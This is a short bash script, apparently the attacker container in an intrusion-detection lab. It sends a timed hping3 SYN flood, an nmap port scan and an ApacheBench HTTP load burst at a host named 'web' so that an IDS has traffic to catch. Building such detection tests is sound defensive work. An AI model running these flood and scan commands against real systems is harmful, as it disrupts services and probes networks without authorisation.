#!/usr/bin/env bash
set -euo pipefail

echo "Attacker started; targeting web:80"

# A short warmup delay to let web & ids come up
sleep 2

# 1) SYN flood for ~6s (no replies expected)
timeout 6s hping3 -S -p 80 -i u100 web || true

# 2) Port scan (fast)
nmap -Pn -p 1-1024 web || true

# 3) HTTP load for ~8–10s
ab -n 2000 -c 50 -k http://web/ || true

# Keep the container alive a little so IDS can flush windows
sleep 5
